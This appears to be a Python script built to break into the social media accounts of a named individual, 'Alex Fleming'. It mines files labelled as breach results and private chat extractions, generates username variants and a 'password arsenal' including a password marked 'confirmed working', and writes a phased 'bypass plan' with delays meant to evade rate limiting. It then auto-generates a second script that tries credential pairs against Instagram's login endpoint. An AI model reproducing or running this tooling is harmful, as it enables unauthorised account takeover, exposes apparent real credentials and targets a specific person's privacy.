#!/usr/bin/env python3
"""
Alex Fleming Account Relationship Mapper
Using existing data to find related accounts
"""

import json
import os
from datetime import datetime

def analyze_existing_data():
    print("🔍 Analyzing existing Alex Fleming data for related accounts...")
    print("=" * 60)
    
    # Check for existing successful data
    success_files = [
        "SUCCESSFUL_BREACH_alx_trading_Fleming654.json",
        "VERIFIED_REAL_DATA.json", 
        "PRIVATE_CHAT_EXTRACTION_20250525_211623.json"
    ]
    
    related_accounts = set()
    contact_info = {}
    
    for file in success_files:
        if os.path.exists(file):
            print(f"📄 Analyzing: {file}")
            
            try:
                with open(file, 'r') as f:
                    data = json.load(f)
                
                # Extract potential usernames/accounts from data
                extract_accounts_from_data(data, related_accounts, contact_info)
                
            except Exception as e:
                print(f"   ❌ Error reading {file}: {e}")
    
    # Add known patterns for Alex Fleming
    generate_alex_fleming_variants(related_accounts)
    
    # Generate bypass strategy
    create_bypass_strategy(related_accounts, contact_info)

def extract_accounts_from_data(data, related_accounts, contact_info):
    """Extract potential account names from existing data"""
    
    # Convert data to string and search for patterns
    data_str = json.dumps(data, indent=2).lower()
    
    # Look for Instagram usernames mentioned
    import re
    username_patterns = [
        r'@([a-zA-Z0-9_.]+)',  # @username format
        r'"username":\s*"([^"]+)"',  # JSON username field
        r'instagram\.com/([a-zA-Z0-9_.]+)',  # Instagram URLs
        r'([a-zA-Z0-9_.]+)\.trading',  # .trading pattern
        r'trading\.([a-zA-Z0-9_.]+)',  # trading. pattern
        r'alex[._]?([a-zA-Z0-9_.]*)',  # alex variations
        r'fleming[._]?([a-zA-Z0-9_.]*)',  # fleming variations
        r'whatilove[._]?([a-zA-Z0-9_.]*)'  # whatilove variations
    ]
    
    for pattern in username_patterns:
        matches = re.findall(pattern, data_str)
        for match in matches:
            if len(match) > 2 and len(match) < 30:  # Reasonable username length
                related_accounts.add(match.strip())
    
    # Extract specific data if available
    if isinstance(data, dict):
        # Look for contact information
        if 'contacts' in data:
            for contact in data.get('contacts', []):
                if isinstance(contact, dict):
                    username = contact.get('username', '')
                    if username:
                        related_accounts.add(username)
                        contact_info[username] = contact
        
        # Look for conversation partners
        if 'conversations' in data:
            for conv in data.get('conversations', []):
                if isinstance(conv, dict):
                    participants = conv.get('participants', [])
                    for participant in participants:
                        if isinstance(participant, dict):
                            username = participant.get('username', '')
                            if username:
                                related_accounts.add(username)

def generate_alex_fleming_variants(related_accounts):
    """Generate likely account variants for Alex Fleming"""
    
    base_names = [
        "alex", "alx", "fleming", "alexfleming", "alxfleming",
        "alex.fleming", "alx.fleming", "fleming.alex", "fleming.alx",
        "alex_fleming", "alx_fleming", "fleming_alex", "fleming_alx",
        "alexf", "alxf", "fleminga", "flemingalx",
        "trading.alex", "alex.trading", "tradingalex", "alextrading",
        "trading.fleming", "fleming.trading", "tradingfleming", "flemingtrading",
        "whatilove", "alex.whatilove", "whatilove.alex", "alx.whatilove",
        "whatilove1728", "fleming654", "alex654", "alx654"
    ]
    
    # Add number variations
    years = ["2023", "2024", "2025", "1728", "654"]
    
    for base in base_names:
        related_accounts.add(base)
        for year in years:
            related_accounts.add(f"{base}{year}")
            related_accounts.add(f"{base}.{year}")
            related_accounts.add(f"{base}_{year}")
            related_accounts.add(f"{year}{base}")

def create_bypass_strategy(related_accounts, contact_info):
    """Create targeted bypass strategy"""
    
    # Known working passwords
    password_arsenal = [
        "Fleming654",     # Confirmed working
        "whatilove1728",  # User provided
        "WhatILove1728",
        "fleming654",
        "Fleming1728",
        "whatilove654",
        "AlexFleming654",
        "alexfleming654",
        "Trading654",
        "trading654",
        "Fleming2024",
        "Fleming2025",
        "Alex654",
        "Alx654",
        "whatilove",
        "WhatILove",
        "Trading1728",
        "trading1728"
    ]
    
    # Filter and prioritize accounts
    priority_accounts = []
    standard_accounts = []
    
    for account in related_accounts:
        if any(keyword in account.lower() for keyword in ['alex', 'fleming', 'whatilove', 'trading']):
            if len(account) >= 3 and len(account) <= 30:  # Valid username length
                if any(priority in account.lower() for priority in ['whatilove1728', 'alex.fleming', 'flemingalex']):
                    priority_accounts.append(account)
                else:
                    standard_accounts.append(account)
    
    # Create bypass plan
    bypass_plan = {
        "analysis_timestamp": datetime.now().isoformat(),
        "target_summary": {
            "total_accounts": len(priority_accounts) + len(standard_accounts),
            "priority_targets": len(priority_accounts),
            "standard_targets": len(standard_accounts),
            "password_variants": len(password_arsenal)
        },
        "priority_targets": sorted(list(set(priority_accounts))),
        "standard_targets": sorted(list(set(standard_accounts))),
        "password_arsenal": password_arsenal,
        "contact_intelligence": contact_info,
        "bypass_strategy": {
            "phase_1": "Target priority accounts with confirmed passwords",
            "phase_2": "Systematic testing of standard accounts", 
            "phase_3": "Deep reconnaissance on successful accounts",
            "rate_limiting": "5-10 second delays between attempts",
            "success_criteria": "Valid sessionid and ds_user_id"
        }
    }
    
    # Save bypass plan
    plan_file = f"ALEX_FLEMING_BYPASS_PLAN_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(plan_file, 'w') as f:
        json.dump(bypass_plan, f, indent=2)
    
    print(f"\n📊 BYPASS PLAN CREATED")
    print("=" * 40)
    print(f"🎯 Priority targets: {len(priority_accounts)}")
    print(f"📋 Standard targets: {len(standard_accounts)}")
    print(f"🔑 Password variants: {len(password_arsenal)}")
    print(f"💾 Plan saved: {plan_file}")
    
    print(f"\n🎯 TOP PRIORITY TARGETS:")
    for i, account in enumerate(priority_accounts[:10], 1):
        print(f"   {i}. {account}")
    
    print(f"\n🔑 PASSWORD ARSENAL:")
    for i, password in enumerate(password_arsenal[:10], 1):
        print(f"   {i}. {password}")
    
    # Create quick test script
    create_quick_test_script(priority_accounts[:5], password_arsenal[:8])

def create_quick_test_script(top_accounts, top_passwords):
    """Create a quick test script for top targets"""
    
    script_content = f'''#!/usr/bin/env python3
"""
Quick Test - Top Alex Fleming Account Targets
Auto-generated bypass script for highest priority accounts
"""

import requests
import json
import time
from datetime import datetime

def quick_test():
    print("🎯 Quick Test - Alex Fleming Top Targets")
    print("=" * 40)
    
    accounts = {top_accounts}
    passwords = {top_passwords}
    
    successes = []
    
    for account in accounts:
        print(f"\\n👤 Testing: {{account}}")
        
        for password in passwords:
            print(f"   🔑 {{password}}")
            
            if test_login(account, password):
                success = {{"account": account, "password": password, "time": datetime.now().isoformat()}}
                successes.append(success)
                print(f"   ✅ SUCCESS! {{account}}:{{password}}")
                
                # Save immediately
                with open(f"QUICK_SUCCESS_{{account}}_{{datetime.now().strftime('%H%M%S')}}.json", 'w') as f:
                    json.dump(success, f, indent=2)
                
                break  # Move to next account
            else:
                print(f"   ❌ Failed")
            
            time.sleep(3)  # Rate limiting
    
    return successes

def test_login(username, password):
    """Simple login test"""
    try:
        session = requests.Session()
        
        # Get CSRF token
        response = session.get("https://www.instagram.com/accounts/login/", timeout=10)
        csrf_token = session.cookies.get('csrftoken', '')
        
        headers = {{
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
            'X-CSRFToken': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        }}
        
        data = {{
            'username': username,
            'password': password,
            'queryParams': '{{}}',
            'optIntoOneTap': 'false'
        }}
        
        response = session.post(
            "https://www.instagram.com/accounts/login/ajax/",
            data=data,
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('authenticated'):
                    return True
            except:
                pass
        
        return False
        
    except Exception:
        return False

if __name__ == "__main__":
    results = quick_test()
    print(f"\\n🏁 Quick test complete. Successes: {{len(results)}}")
'''
    
    with open('quick_alex_fleming_test.py', 'w') as f:
        f.write(script_content)
    
    print(f"\n⚡ Quick test script created: quick_alex_fleming_test.py")
    print(f"   Run with: python3 quick_alex_fleming_test.py")

if __name__ == "__main__":
    analyze_existing_data()
    print(f"\n🏁 Analysis complete!")
